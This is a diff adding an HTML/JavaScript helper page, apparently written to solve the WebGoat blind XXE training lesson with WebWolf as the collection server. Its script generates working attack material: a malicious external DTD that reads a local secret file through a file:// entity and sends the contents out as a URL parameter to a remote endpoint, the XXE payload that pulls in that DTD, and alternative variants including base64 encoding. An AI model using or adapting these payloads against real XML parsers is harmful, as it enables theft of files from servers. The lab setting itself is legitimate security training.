@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Blind XXE Attack Tool</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            max-width: 1100px;
+            margin: 20px auto;
+            padding: 30px;
+            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+        }
+        h1 {
+            color: #6a11cb;
+            margin-top: 0;
+            border-bottom: 3px solid #2575fc;
+            padding-bottom: 15px;
+        }
+        .step {
+            background: #f8f9fa;
+            padding: 25px;
+            margin: 20px 0;
+            border-radius: 10px;
+            border-left: 5px solid #2575fc;
+        }
+        .step h3 {
+            margin-top: 0;
+            color: #6a11cb;
+        }
+        .alert {
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 8px;
+            border-left: 5px solid;
+        }
+        .alert-info { background: #e3f2fd; border-color: #2196F3; color: #0d47a1; }
+        .alert-success { background: #e8f5e9; border-color: #4caf50; color: #1b5e20; }
+        .alert-warning { background: #fff3cd; border-color: #ff9800; color: #e65100; }
+        label {
+            display: block;
+            font-weight: bold;
+            margin: 10px 0 5px 0;
+            color: #333;
+        }
+        input[type="text"], textarea {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 6px;
+            font-size: 14px;
+            font-family: monospace;
+            box-sizing: border-box;
+        }
+        textarea {
+            min-height: 120px;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+        }
+        button {
+            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
+            color: white;
+            padding: 12px 25px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+            margin: 10px 5px 10px 0;
+            transition: all 0.3s;
+        }
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(106, 17, 203, 0.4);
+        }
+        button.secondary {
+            background: linear-gradient(135deg, #757575 0%, #424242 100%);
+            padding: 10px 20px;
+            font-size: 14px;
+        }
+        code {
+            background: #e8eaf6;
+            padding: 3px 8px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            color: #5e35b1;
+        }
+        pre {
+            background: #2d2d2d;
+            color: #f8f8f2;
+            padding: 15px;
+            border-radius: 6px;
+            overflow-x: auto;
+            font-size: 13px;
+        }
+        .code-box {
+            background: #f5f5f5;
+            padding: 15px;
+            border-radius: 6px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔍 Blind XXE Attack Tool</h1>
+        
+        <div class="alert alert-warning">
+            <strong>⚠️ Challenge:</strong> Exfiltrate <code>secret.txt</code> using Blind XXE + WebWolf
+        </div>
+
+        <div class="alert alert-info">
+            <strong>📝 How it works:</strong><br>
+            1. Host malicious DTD on WebWolf<br>
+            2. DTD reads secret.txt and sends it to WebWolf<br>
+            3. Check WebWolf "Incoming requests" for the data<br>
+            4. Submit the secret as a comment
+        </div>
+
+        <!-- Configuration -->
+        <div class="step">
+            <h3>⚙️ Configuration</h3>
+            
+            <label>Your WebGoat Username:</label>
+            <input type="text" id="username" placeholder="e.g., nooniman" value="nooniman" />
+            
+            <label>WebWolf Base URL:</label>
+            <input type="text" id="webwolfUrl" value="http://127.0.0.1:8002" />
+            
+            <label>WebGoat XXE Endpoint:</label>
+            <input type="text" id="webgoatUrl" value="http://192.168.254.112:8001/WebGoat/xxe/blind" />
+        </div>
+
+        <!-- Step 1: DTD Generator -->
+        <div class="step">
+            <h3>📄 Step 1: Generate Malicious DTD</h3>
+            <p>This DTD will read secret.txt and send it to WebWolf</p>
+            
+            <label>Secret File Path (auto-filled):</label>
+            <input type="text" id="secretPath" readonly />
+            
+            <label>Exfiltration Endpoint:</label>
+            <input type="text" id="exfilEndpoint" value="/WebWolf/landing" />
+            
+            <button onclick="generateDTD()">🔨 Generate DTD</button>
+            
+            <div id="dtdOutput" style="display:none;">
+                <label>DTD Content (save as <code>attack.dtd</code> in WebWolf):</label>
+                <textarea id="dtdContent" readonly></textarea>
+                <button onclick="copyDTD()" class="secondary">📋 Copy DTD</button>
+                
+                <div class="alert alert-info" style="margin-top: 15px;">
+                    <strong>📤 Upload to WebWolf:</strong>
+                    <ol>
+                        <li>Open WebWolf: <a href="http://127.0.0.1:8002/WebWolf" target="_blank">http://127.0.0.1:8002/WebWolf</a></li>
+                        <li>Go to <strong>"Files"</strong> section</li>
+                        <li>Click <strong>"Upload"</strong></li>
+                        <li>Name: <code>attack.dtd</code></li>
+                        <li>Paste the DTD content above</li>
+                        <li>Upload!</li>
+                    </ol>
+                </div>
+            </div>
+        </div>
+
+        <!-- Step 2: XXE Payload -->
+        <div class="step">
+            <h3>💣 Step 2: Generate XXE Payload</h3>
+            <p>Submit this to WebGoat comment field</p>
+            
+            <button onclick="generateXXE()">🔨 Generate XXE Payload</button>
+            
+            <div id="xxeOutput" style="display:none;">
+                <label>XXE Payload (submit in WebGoat comment):</label>
+                <textarea id="xxeContent" readonly></textarea>
+                <button onclick="copyXXE()" class="secondary">📋 Copy XXE</button>
+                
+                <div class="alert alert-info" style="margin-top: 15px;">
+                    <strong>📤 Submit to WebGoat:</strong>
+                    <ol>
+                        <li>Go to WebGoat XXE Blind lesson</li>
+                        <li>Find the comment input field</li>
+                        <li>Paste the XXE payload above</li>
+                        <li>Submit!</li>
+                    </ol>
+                </div>
+            </div>
+        </div>
+
+        <!-- Step 3: Check WebWolf -->
+        <div class="step">
+            <h3>📥 Step 3: Check WebWolf for Data</h3>
+            
+            <button onclick="openWebWolf()">🌐 Open WebWolf Incoming Requests</button>
+            
+            <div class="alert alert-success" style="margin-top: 15px;">
+                <strong>✅ What to do:</strong>
+                <ol>
+                    <li>Click "Open WebWolf Incoming Requests"</li>
+                    <li>Look for a GET request to <code id="exfilDisplay"></code></li>
+                    <li>Find the parameter containing the secret (e.g., <code>?secret=...</code>)</li>
+                    <li>Copy the secret value</li>
+                </ol>
+            </div>
+        </div>
+
+        <!-- Step 4: Submit Secret -->
+        <div class="step">
+            <h3>🎯 Step 4: Submit the Secret</h3>
+            
+            <label>Paste the secret from WebWolf:</label>
+            <input type="text" id="secretValue" placeholder="Paste secret here" />
+            
+            <div class="alert alert-warning" style="margin-top: 15px;">
+                <strong>⚠️ Final Step:</strong>
+                <ol>
+                    <li>Copy the secret value from WebWolf</li>
+                    <li>Paste it in the field above</li>
+                    <li>Go to WebGoat</li>
+                    <li>Submit a NEW comment with <strong>ONLY the secret text</strong></li>
+                    <li>Lesson complete! 🎉</li>
+                </ol>
+            </div>
+        </div>
+
+        <!-- Alternative DTDs -->
+        <div class="step">
+            <h3>🔄 Alternative DTD Formats</h3>
+            <p>If the default doesn't work, try these:</p>
+            
+            <button onclick="generateAltDTD('data')" class="secondary">Use ?data=</button>
+            <button onclick="generateAltDTD('content')" class="secondary">Use ?content=</button>
+            <button onclick="generateAltDTD('base64')" class="secondary">Base64 Encoding</button>
+            
+            <div id="altDtdOutput" style="display:none; margin-top: 15px;">
+                <label>Alternative DTD:</label>
+                <textarea id="altDtdContent" readonly></textarea>
+                <button onclick="copyAltDTD()" class="secondary">📋 Copy</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function generateDTD() {
+            const username = document.getElementById('username').value.trim();
+            const webwolfUrl = document.getElementById('webwolfUrl').value.trim();
+            const exfilEndpoint = document.getElementById('exfilEndpoint').value.trim();
+            
+            if (!username) {
+                alert('Please enter your WebGoat username!');
+                return;
+            }
+            
+            // Generate file path
+            const secretPath = `file:///C:/Users/mahad/.webgoat-2025.3/XXE/${username}/secret.txt`;
+            document.getElementById('secretPath').value = secretPath;
+            
+            // Generate DTD
+            const dtd = `<!ENTITY % file SYSTEM "${secretPath}">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '${webwolfUrl}${exfilEndpoint}?secret=%file;'>">
+%eval;
+%exfil;`;
+            
+            document.getElementById('dtdContent').value = dtd;
+            document.getElementById('dtdOutput').style.display = 'block';
+            
+            // Update exfil display
+            document.getElementById('exfilDisplay').textContent = exfilEndpoint;
+        }
+        
+        function generateXXE() {
+            const username = document.getElementById('username').value.trim();
+            const webwolfUrl = document.getElementById('webwolfUrl').value.trim();
+            
+            if (!username) {
+                alert('Please enter your username first and generate DTD!');
+                return;
+            }
+            
+            const dtdUrl = `${webwolfUrl}/files/${username}/attack.dtd`;
+            
+            const xxe = `<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY % remote SYSTEM "${dtdUrl}">
+  %remote;
+]>
+<comment>
+  <text>Blind XXE Attack</text>
+</comment>`;
+            
+            document.getElementById('xxeContent').value = xxe;
+            document.getElementById('xxeOutput').style.display = 'block';
+        }
+        
+        function generateAltDTD(type) {
+            const username = document.getElementById('username').value.trim();
+            const webwolfUrl = document.getElementById('webwolfUrl').value.trim();
+            
+            if (!username) {
+                alert('Please enter your username first!');
+                return;
+            }
+            
+            const secretPath = `file:///C:/Users/mahad/.webgoat-2025.3/XXE/${username}/secret.txt`;
+            let dtd = '';
+            
+            if (type === 'data') {
+                dtd = `<!ENTITY % file SYSTEM "${secretPath}">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '${webwolfUrl}/WebWolf/landing?data=%file;'>">
+%eval;
+%exfil;`;
+            } else if (type === 'content') {
+                dtd = `<!ENTITY % file SYSTEM "${secretPath}">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '${webwolfUrl}/landing?content=%file;'>">
+%eval;
+%exfil;`;
+            } else if (type === 'base64') {
+                dtd = `<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=${secretPath}">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '${webwolfUrl}/WebWolf/landing?secret=%file;'>">
+%eval;
+%exfil;`;
+            }
+            
+            document.getElementById('altDtdContent').value = dtd;
+            document.getElementById('altDtdOutput').style.display = 'block';
+        }
+        
+        function copyDTD() {
+            const dtd = document.getElementById('dtdContent').value;
+            navigator.clipboard.writeText(dtd).then(() => {
+                alert('✅ DTD copied! Upload to WebWolf as attack.dtd');
+            });
+        }
+        
+        function copyXXE() {
+            const xxe = document.getElementById('xxeContent').value;
+            navigator.clipboard.writeText(xxe).then(() => {
+                alert('✅ XXE payload copied! Submit in WebGoat comment field');
+            });
+        }
+        
+        function copyAltDTD() {
+            const dtd = document.getElementById('altDtdContent').value;
+            navigator.clipboard.writeText(dtd).then(() => {
+                alert('✅ Alternative DTD copied!');
+            });
+        }
+        
+        function openWebWolf() {
+            const url = document.getElementById('webwolfUrl').value + '/WebWolf/requests';
+            window.open(url, '_blank');
+        }
+        
+        // Initialize
+        window.onload = function() {
+            console.log('Blind XXE Attack Tool Loaded');
+            console.log('Steps:');
+            console.log('1. Generate DTD');
+            console.log('2. Upload DTD to WebWolf');
+            console.log('3. Generate XXE payload');
+            console.log('4. Submit XXE to WebGoat');
+            console.log('5. Check WebWolf incoming requests');
+            console.log('6. Submit secret as comment');
+        };
+    </script>
+</body>
+</html>
